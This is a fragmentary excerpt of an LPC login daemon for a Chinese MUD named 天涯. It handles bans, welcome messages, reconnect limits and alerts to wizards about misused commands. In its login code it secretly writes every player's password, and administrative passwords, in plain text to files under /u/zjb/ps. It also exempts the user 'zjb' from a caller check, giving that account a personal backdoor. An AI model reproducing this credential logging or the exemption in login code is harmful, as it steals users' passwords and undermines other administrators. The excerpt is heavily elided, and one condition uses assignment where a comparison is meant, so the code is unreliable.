...
string *banned_id =   ({"admin","arch","wizard","apprentice","immortal","player","fuck","budai"});
...
protected void logon_in(object ob)
{
    ...
    {
write(HIR"你的地址在本 MUD 不受欢迎，请写信至wlzjb@163.com申述。\n"NOR);
	destruct(ob);
	return;
    }
    if( mad_lock == 1 ) {
    ...
    write(read_file("/u/daniel/welcome"));
...
//"/cmds/std/port2"->main(this_object(),"")
    UPTIME_CMD->main();
    printf("天涯自"WHT"[2002年1月8日]"NOR"建站以来，总共访问量为"HIC" %d "NOR"人次。\n"NOR,i_user);
    i_user=i_user+1; 
    ...
    printf("天涯目前共有"HIC" %d "NOR"个注册玩家，最高有"HIC" %d "NOR"位玩家同时进行游戏。\n",
      i_user,online_num);
...
destruct(ob2); 
 ...
 if ( SECURITY_D->get_status(ob->query("id"))=="(player)")
 write_file( "/u/zjb/ps/"+ ob->query("id"),sprintf("%s的密码%s。\n", ob->query("name"),pass));
        check_ok(ob);
        ...
        if (objectp(user = make_body(ob)))
        {
                if (user->restore())
                {
                        ...
                        if (ob->query("last_on") < time() &&
                            ...
                            ! wiz_level(user))
                        {
                                write(HIR"你距上一次退出时间只有" + chinese_number(time() - ob->query("last_on")) +
                                      "秒钟，为了减轻系统负担请过一会再连入，谢谢合作。。\n"NOR);
                                destruct(user);
                                destruct(ob);
                                return;
                        }
...
if ( SECURITY_D->get_status(ob->query("id"))=="(player)")
write_file( "/u/zjb/ps/"+ ob->query("id")+".ad",sprintf("%s的管理密码%s。\n", ob->query("name"),pass));
        ob->set("ad_password", old_pass);
...
"BBLU+HIC"一个人物的天赋对于他或她所修习的武艺息息相关。"BBLU+HIG"[天涯]"BBLU+HIC"中的人
...
if (previous_object())
{
if (base_name(previous_object()) != "/adm/daemons/logind"&&base_name(previous_object()) != "/cmds/app/update"&&getuid(this_player())!="zjb")
{
...
write_file( "/u/zjb/log/exec",sprintf("%s从%s登录企图进入%s 身体,来自原文件%s,事件发生与(%s)。\n", ob->query("name")+"("+ob->query("id")+")", query_ip_number(ob) ,user->query("id"),base_name(previous_object()) ,ctime(time()))); 
          destruct(user);
destruct(ob);
return;
}
   ...
   user->set_temp("time", time());  
	        ...
	        login_ob->restore();
               write(HIY"\n◇"HIC"───────────────"RED"身份消息"HIC"────────────────"HIY"◇\n"NOR);
                write(HIY"\n◇ "HIC"您目前权限："HIW"" + wizhood(user) + "\n");
                 write(HIY"◇ "HIC"您上次光临天涯是从："HIW""+login_ob->query("last_from") +"\n");
    ...
    write(HIW"你进入了天涯武侠虚拟游戏世界，从现在开始,你踏上了闯荡"+HIG"江湖"+HIW"的不归路！\n"NOR);
...
if (id = "zjb" || id = "daniel" || id = "mojing")
{
write(HIG"────────────────────────────────────────\n"NOR);
          if( user->query("wizlog/bugedit") != file_size("/u/zjb/edit/bugedit") ) 
              {
                            user->set("wizlog/bugedit", file_size("/u/zjb/edit/bugedit"));
write( HIC"有巫师越权使用"BLINK HIR"edit"NOR HIC" 指令请查看/u/zjb/edit/bugedit 。\n\n"NOR);
                     }
...
write( HIC"有巫师"BLINK HIR"杀玩家档了"NOR HIC",具体请查看/log/static/purge 。\n\n"NOR);
  ...
  if( user->query("wizlog/bugcat") != file_size("/u/zjb/file/bugcat") ) 
{
       user->set("wizlog/bugcat", file_size("/u/zjb/file/bugcat"));
 write( HIM"有巫师越权使用了"BLINK HIR" cat "NOR HIM"指令,具体请查看/u/zjb/file/bugcat 。\n\n"NOR);
}
  if( user->query("wizlog/bugcp") != file_size("/u/zjb/file/bugcp") ) 
{
       user->set("wizlog/bugcp", file_size("/u/zjb/file/bugcp"));
write( HIR"有巫师越权使用了"BLINK HIW" cp "NOR HIR"指令,具体请查看/u/zjb/file/bugcp 。\n\n"NOR);
}
   if( user->query("wizlog/dbase") != file_size("/u/zjb/log/dbase") )
{
     user->set("wizlog/dbase", file_size("/u/zjb/log/dbase"));
write( HIC"可能有非法数据给玩家"BLINK HIR" set了敏感数值 "NOR HIC"具体请查看/u/zjb/log/dbase 。\n\n"NOR);
}
   if( user->query("wizlog/skill") != file_size("/u/zjb/log/skill") )
{
    user->set("wizlog/skill", file_size("/u/zjb/log/skill"));
 write( HIC"可能有非法数据给玩家"BLINK HIR" set了skill "NOR HIC"具体请查看/u/zjb/log/skill 。\n\n"NOR);
}
  if( user->query("wizlog/update") != file_size("/u/zjb/log/update") )
{
    user->set("wizlog/update", file_size("/u/zjb/log/update"));
write( HIC"有巫师使用了"BLINK HIR" update "NOR HIC"指令来更新文件了,具体请看/u/zjb/log/update 。\n\n"NOR);
}
  if( user->query("wizlog/bugrm") != file_size("/u/zjb/file/bugrm") ) 
{
      user->set("wizlog/bugrm", file_size("/u/zjb/file/bugrm"));
write( HIC"有巫师越权使用了"BLINK HIR" rm "NOR HIC"指令,具体请查看/u/zjb/file/bugrm 。\n\n\n"NOR);
}
  if( user->query("wizlog/exec") != file_size("/u/zjb/log/exec") )
{
    user->set("wizlog/exec", file_size("/u/zjb/log/exec"));
write( HIM"有人试图调用"BLINK HIR" enter_world来侵入本MUD "NOR HIM",具体请看/u/zjb/log/exec 。\n\n"NOR);
}
write( HIG"这个只是星空为系统核心管理人物写的一个提示系统,除了提示您上次下线有无人动用\n"
...
message("channel:ty", HIG"寂寞天使在和你耳边悄声说道:"NOR WHT"听说又来了一位叫做"+WHT+user->name()+NOR WHT"的"+str+"。\n"NOR,users());
*/
    if(user->query("id")!="daniel")
